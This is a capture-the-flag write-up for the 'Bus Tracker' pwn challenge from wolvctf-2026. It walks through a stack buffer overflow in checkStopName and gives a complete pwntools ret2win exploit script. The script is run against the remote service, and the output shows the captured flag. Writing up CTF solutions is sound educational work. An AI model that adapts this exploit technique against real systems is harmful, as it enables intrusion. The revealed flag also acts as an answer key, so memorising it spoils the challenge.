---
title: Bus Tracker
challenge_type: Pwn
difficulty: easy
author: 0xir0nroot
writeup_author: "xabito"
competition: wolvctf-2026
summary: |-
  The Blue Bus app crashes whenever I type my stop name. Dispatch says there's still an admin override compiled in somewhere.
connections:
  - url: bus-tracker.wolvctf-2026.kctf.cloud:1337
attachments:
  - title: dis.tar.gz
    url: /assets/files/wolvctf-2026/bus-tracker/dis.tar.gz
---

## Recon

We unpacked `dis.tar.gz` and extracted `chal`. The binary is statically linked
and not stripped, so every symbol is intact and no libc fingerprint is needed.

```bash
$ checksec --file=chal
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

The "Canary found" line comes from the static libc exporting
`__stack_chk_fail`. The vulnerable function itself does not install or verify a
canary, as its disassembly confirms. The symbol table also gave us the two
functions we needed: `checkStopName` at `0x401871` and `dispatcherOverride` at
`0x4017e5`.

## Exploitation

`checkStopName` reads 256 bytes into a 64-byte stack buffer with no canary in the
function:

```console
$ objdump -d chal
0000000000401871 <checkStopName>:
  401875: push   rbp
  401876: mov    rbp, rsp
  401879: sub    rsp, 0x40                 ; 64-byte frame
  40189b: lea    rax, [rbp - 0x40]         ; buffer at rbp-0x40
  40189f: mov    edx, 0x100                ; 256 bytes requested
  4018ac: call   read
  4018b2: leave
  4018b3: ret
```

The buffer sits at `rbp-0x40`, so the saved return address starts 72 bytes in
(`0x40` buffer + 8 saved `rbp`). `dispatcherOverride` opens `flag.txt`, reads it
with `fgets`, and prints it with `printf("%s")`.

The `leave; ret` path enters `dispatcherOverride` with a misaligned stack,
causing static glibc's `fopen64` to fault. The bare `ret` gadget at `0x40101a`,
found with `ROPgadget --binary chal --only "ret"`, consumes an extra 8 bytes and
restores alignment. The overwritten saved return address first runs the bare
`ret`, which then returns into `dispatcherOverride`. No PIE keeps both addresses
fixed.

We verified the chain locally in an `amd64` Docker container with a fake
`flag.txt`. The direct jump without the gadget reliably segfaulted, while the
gadget-corrected payload printed the fake flag.

## Flag capture

We used the verified payload against the remote service:

```python
import sys
from pwn import *

context.arch = 'amd64'

WIN    = 0x4017e5   # dispatcherOverride
RET    = 0x40101a   # bare ret (stack 16-byte alignment)
OFFSET = 72

payload = b'A' * OFFSET + p64(RET) + p64(WIN)

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    io = remote('bus-tracker.wolvctf-2026.kctf.cloud', 1337)
else:
    io = process('./chal')

io.recvuntil(b'Enter your stop name: ')
io.send(payload)
print(io.recvall(timeout=10).decode(errors='replace'))
```

```bash
$ python exploit.py remote
[+] Opening connection to bus-tracker.wolvctf-2026.kctf.cloud on port 1337: Done

wctf{bus_ni9davhafgyy8iqq}
```
